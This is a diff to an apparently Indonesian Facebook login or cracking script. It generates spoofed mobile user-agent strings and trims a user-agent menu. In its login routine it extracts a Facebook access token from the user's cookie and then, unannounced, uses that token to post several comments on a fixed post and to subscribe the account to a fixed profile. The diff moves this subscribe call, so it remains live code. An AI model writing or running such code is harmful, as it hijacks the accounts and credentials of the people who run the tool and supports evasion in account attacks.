@@ -76,8 +76,6 @@ ngen=[]
 opsi=[]
 uidf=[]
 free=[]
-raka=[]
-liu=[]
 ugent = []
 licenseKey=[]
 console = Console()
@@ -115,69 +113,8 @@ for xd in range(10000):
     strvredmi1 = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(redmi))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
     strvnokiax = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
     strvgt = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
-    uateddy = random.choice([strvredmi1,strvredmi, strvsamsung,strvgt])
+    uateddy = random.choice([strvredmi, strvsamsung,strvgt])
     free.append(uateddy)
-
-ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
-ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
-ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-
-def var_ugen():
-    print("%s╠══[%s1%s] %sDapatkan User Agent"%(O,P,O,P))
-    print("%s╠══[%s2%s] %sGanti User Agent %s(%sManual%s)"%(O,P,O,P,O,P,O))
-    print("%s╠══[%s3%s] %sGanti User Agent %s(%sSesuaikan HP%s)"%(O,P,O,P,O,P,O))
-    print("%s╠══[%s4%s] %sHapus User Agent"%(O,P,O,P))
-    print("%s╠══[%s5%s] %sCek User Agent"%(O,P,O,P))
-    print("%s╠══[%s0%s] %sKembali"%(O,P,O,P))
-### Menu User Agent
-
-def ugen():
-    var_ugen()
-    pmu = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
-    print('%s║'%(O))
-    if pmu in[""]:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));login()
-    elif pmu in ['1','01','001','a']:os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8');input('%s╚══[ %sKembali %s]%s'%(O,P,O,P));login()
-    elif pmu in ['2','02','002','b']:
-        os.system("rm -rf bbnew.txt");ua = input("%s╚══[%s•%s] %sMasukkan User Agent : \n\n"%(O,P,O,P))
-        try:ugent = open('bbnew.txt','w');ugent.write(ua);ugent.close();jalan("\n%s╔══[ %sBerhasil Mengganti User Agent %s]"%(O,P,O));print('%s║'%(O));input('%s╚══[ %sKembali %s]%s'%(O,P,O,P));login()
-        except (KeyError,IOError):jalan("\n%s╔══[ %sGagal Mengganti User Agent %s]"%(M,P,M));print('%s║'%(M));input('%s╚══[ %sKembali %s]%s'%(M,P,M,P));login()
-    elif pmu in ['3','03','003','c']:ugen_hp()
-    elif pmu in ['4','04','004','d']:os.system("rm -rf bbnew.txt");jalan("%s╠══[ %sUser Agent Berhasil Dihapus %s]"%(O,P,O));print('%s║'%(O));input('%s╚══[ %sKembali %s]%s'%(O,P,O,P));login()
-    elif pmu in ['5','05','005','e']:
-        try:ungser = open('bbnew.txt', 'r').read()
-        except (KeyError,IOError):ungser = 'Tidak Ditemukan'
-        print("%s╚══[%s•%s] %sUser Agent Anda  : \n\n%s%s"%(O,P,O,P,O,ungser));jalan("\n%s╔══[ %sIni Adalah User Agent Anda Saat Ini %s]"%(O,P,O));print('%s║'%(O));input('%s╚══[ %sKembali %s]%s'%(O,P,O,P));login()
-    elif pmu in ['0','00','000','f']:login()
-    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
-def ugen_hp():
-    os.system("rm -rf bbnew.txt")
-    print('%s╠══[%s1%s] %sXiaomi'%(O,P,O,P))
-    print('%s╠══[%s2%s] %sNokia'%(O,P,O,P))
-    print('%s╠══[%s3%s] %sAsus'%(O,P,O,P))
-    print('%s╠══[%s4%s] %sHuawei'%(O,P,O,P))
-    print('%s╠══[%s5%s] %sVivo'%(O,P,O,P))
-    print('%s╠══[%s6%s] %sOppo'%(O,P,O,P))
-    print('%s╠══[%s7%s] %sSamsung'%(O,P,O,P))
-    print('%s╠══[%s8%s] %sWindows'%(O,P,O,P))
-    pc = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
-    print('%s║'%(O))
-    if pc in['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));login()
-    elif pc in ['1','01']:ugent = open('bbnew.txt','w');ugent.write(ua_xiaomi);ugent.close()
-    elif pc in ['2','02']:ugent = open('bbnew.txt','w');ugent.write(ua_nokia);ugent.close()
-    elif pc in ['3','03']:ugent = open('bbnew.txt','w');ugent.write(ua_asus);ugent.close()
-    elif pc in ['4','04']:ugent = open('bbnew.txt','w');ugent.write(ua_huawei);ugent.close()
-    elif pc in ['5','05']:ugent = open('bbnew.txt','w');ugent.write(ua_vivo);ugent.close()
-    elif pc in ['6','06']:ugent = open('bbnew.txt','w');ugent.write(ua_oppo);ugent.close()
-    elif pc in ['7','07']:ugent = open('bbnew.txt','w');ugent.write(ua_samsung);ugent.close()
-    elif pc in ['8','08']:ugent = open('bbnew.txt','w');ugent.write(ua_windows);ugent.close()
-    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));login()
-    jalan("%s╠══[ %sBerhasil Mengganti User Agent %s]"%(O,P,O));print('%s║'%(O));input('%s╚══[ %sKembali %s]%s'%(O,P,O,P));login()
-
 
 
 #------------[ INDICATION ]---------------#
@@ -512,10 +449,10 @@ def login_lagi334():
 									tok1 = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
 									open(".token1.txt","w").write(tok1)
 									Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{tok1}""",width=80, style=f"{color_panel}", title="[bold green]> TOKEN EAAB [bold green]<"))
+									requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tok1))
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom4}&access_token={tok1}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom3}&access_token={tok1}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom6}&access_token={tok1}", headers = {"cookie":your_cookies})
-									requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tok1))
 							except Exception as e:
 								print(e)
 							try:
